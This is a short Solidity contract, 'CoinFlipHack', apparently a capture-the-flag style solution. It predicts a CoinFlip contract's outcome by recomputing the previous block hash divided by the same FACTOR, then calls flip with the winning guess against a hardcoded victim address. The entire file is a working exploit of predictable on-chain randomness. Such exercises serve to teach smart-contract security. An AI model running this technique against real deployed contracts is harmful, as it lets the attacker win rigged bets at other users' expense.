// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';
import "./CoinFlip.sol";

contract CoinFlipHack {

  // guess the outcome of the flip by following exactly the way the original contract determines it
  CoinFlip c;
  using SafeMath for uint256;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  address victim;

  function hack() public{
    // original smart contract address
    victim = 0xCf7Ed3AccA5a467e9e704C703E8D87F634fB0Fc9;
    // instance of deployed smart contract
    c = CoinFlip(victim);
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;
    c.flip(side);
  }

}
